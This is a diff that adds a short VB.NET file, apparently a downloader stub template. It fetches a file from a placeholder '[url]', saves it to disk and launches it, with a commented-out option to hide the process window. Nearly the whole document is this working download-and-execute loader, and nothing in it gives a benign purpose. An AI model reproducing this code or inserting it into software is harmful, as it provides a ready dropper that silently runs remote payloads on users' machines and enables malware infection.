@@ -1,0 +1,14 @@
+﻿Class Client
+Sub Main()
+	Using wc As New System.Net.WebClient()
+            Dim file As String = "[url]"
+            Dim data As Byte() = wc.DownloadData(file)
+            Dim splitter() As String = file.Split("/")
+	    Dim tempFilePath As String = splitter(splitter.Length - 1)
+            System.IO.File.WriteAllBytes(tempFilePath, data)
+            Dim startInfo As New System.Diagnostics.ProcessStartInfo(tempFilePath)
+            '/\startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
+            System.Diagnostics.Process.Start(startInfo)
+        End Using
+End Sub
+End Class
